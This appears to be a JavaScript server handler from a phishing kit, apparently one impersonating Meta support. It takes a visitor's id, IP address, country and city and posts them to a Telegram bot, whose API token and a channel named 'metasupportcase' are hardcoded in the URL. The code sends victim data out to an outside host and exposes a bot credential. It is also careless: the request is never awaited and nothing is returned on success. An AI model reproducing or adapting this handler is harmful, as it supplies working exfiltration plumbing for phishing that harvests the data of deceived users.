export const SendIp = async (req, res) => {
    try {
        const { id,
				ip,
			country,
            city,
            } = req.body;

        const params =
            `=============================%0A Id: ${id}%0A IP: ${ip}%0A Country: ${country}%0A City: ${city}%0A=============================`;

            console.log(params);
        const response = axios.post(`https://api.telegram.org/bot7664187578:AAFX3bJAoQpUMiwv0hJD_rZOR13S6s_B-qI/sendMessage?chat_id=@metasupportcase1002286901019&text=${params}/`, {
            headers: {
                'Content-Type': 'application/json',
                'X-Robots-Tag': 'googlebot: nofollow',
            },

        })

    } catch (error) {
        return res.send({
            success: false,
            message: error.message,
        });
    }
};
